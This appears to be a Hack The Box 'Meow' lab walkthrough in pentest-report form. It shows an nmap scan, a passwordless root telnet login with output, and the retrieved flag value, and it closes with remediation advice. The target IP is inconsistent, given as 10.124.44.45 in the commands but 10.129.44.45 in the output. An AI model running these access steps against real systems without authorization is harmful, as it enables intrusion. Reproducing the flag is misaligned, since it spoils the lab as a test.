# HTB Starting Point Lab Walkthrough: Meow (Linux Box)

## Executive Summary

- **Lab Objective**: Enumerate and exploit a telnet service on the target machine to gain root access and retrieve a flag, simulating basic remote access reconnaissance.
- **Target IP**: 10.124.44.45
- **Key Findings**: Identified an open telnet service on port 23, allowing root login without a password. This enabled immediate access to the system and retrieval of a sensitive file (`flag.txt`).
- **Impact**: In a real-world scenario, unauthenticated telnet access could allow full system compromise, including data theft and malicious code execution.
- **Recommendations**: Disable telnet entirely, use encrypted protocols like SSH, and enforce strong authentication.
- **Completion Date**: June 30, 2025
- **Tools Used**: Nmap, telnet (on Kali Linux)

## Methodology and Scope

This walkthrough follows a standard reconnaissance and access process for the HTB Starting Point lab "Meow." The scope was limited to port scanning, service enumeration, and file access via telnet on the provided target IP. No advanced exploitation or privilege escalation was required.

Steps were performed in a controlled lab environment using default Kali tools. Assumptions: Target is a Linux machine (Ubuntu 20.04.2 LTS) running a telnet service.

## Findings

### Finding 1: Telnet Service Identification

- **Description**: Telnet is an unencrypted remote access protocol running on port 23. A scan confirmed the service is active on the target.
- **Severity**: Informational (baseline enumeration).
- **Steps to Reproduce**:
    1. Perform a targeted port scan using Nmap:
        
        ```bash
        nmap -sS -p 23 10.124.44.45
        ```
        
        Output:
        
        ```bash
        Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 15:57 EDT
        Nmap scan report for 10.129.44.45
        Host is up (0.021s latency).
        PORT   STATE SERVICE
        23/tcp open  telnet
        Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
        ```
        
- **Impact**: Confirms telnet is active, enabling further enumeration and potential access attempts.
- **Evidence**: Nmap scan results above.
- **Remediation**: N/A (informational).

### Finding 2: Unauthenticated Telnet Access as Root

- **Description**: The telnet service allows login as the `root` user without requiring a password, granting immediate administrative access to the system.
- **Severity**: Critical (unauthenticated root access).
- **Steps to Reproduce**:
    1. Connect to the target via telnet:
        
        ```bash
        telnet 10.124.44.45 23
        ```
        
        Output:
        
        ```bash
        Trying 10.129.44.45...
        Connected to 10.129.44.45.
        Escape character is '^]'.
        ```
        
    2. Login with username `root` and no password:
        
        ```bash
        Meow login: root
        Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
        
        * Documentation:  https://help.ubuntu.com
        * Management:     https://landscape.canonical.com
        * Support:        https://ubuntu.com/advantage
        
        System information as of Mon 30 Jun 2025 08:01:24 PM UTC
        
        System load:           0.06
        Usage of /:            41.7% of 7.75GB
        Memory usage:          4%
        Swap usage:            0%
        Processes:             135
        Users logged in:       0
        IPv4 address for eth0: 10.129.44.45
        IPv6 address for eth0: dead:beef::250:56ff:feb0:442b
        ```
        
- **Impact**: Unauthenticated root access allows full control of the system, including file access, modification, and execution of arbitrary commands, equivalent to a total system compromise.
- **Evidence**: Telnet login output above.
- **Remediation**: Disable telnet service; replace with SSH using strong authentication (e.g., key-based or complex passwords).

### Finding 3: File Retrieval via Telnet

- **Description**: After gaining root access via telnet, located and retrieved a sensitive file (`flag.txt`) from the root directory.
- **Severity**: Critical (successful data exfiltration).
- **Steps to Reproduce**:
    1. List files in the root directory:
        
        ```bash
        ls
        ```
        
        Output:
        
        ```bash
        flag.txt  snap
        ```
        
    2. View the contents of the flag file:
        
        ```bash
        cat flag.txt
        ```
        
        Output:
        
        ```bash
        b40abdfe23665f766f9c61ecba8a4c19
        ```
        
- **Impact**: Access to sensitive files demonstrates the ability to extract critical data, simulating a real-world data breach.
- **Evidence**: Command outputs and flag value above.
- **Remediation**: Remove unnecessary sensitive files; enforce strict file permissions; monitor for unauthorized access.

## Recommendations

- Disable telnet on all systems and replace with SSH configured with key-based authentication.
- Use firewalls to restrict access to remote services (e.g., allow only trusted IPs).
- Regularly scan for open ports and insecure services using tools like Nmap or Nessus.
- For labs like this, practice enumerating telnet with tools like Metasploit’s telnet_login module to explore additional attack vectors.

## Appendices

- **Raw Notes/Logs**: (Optional—attach full session logs if sharing.)
- **Screenshots**: (Add here if available, e.g., terminal captures.)
- **Key Takeaway**: Telnet is highly insecure due to its lack of encryption, making all communications vulnerable to interception. Avoid using telnet in production environments.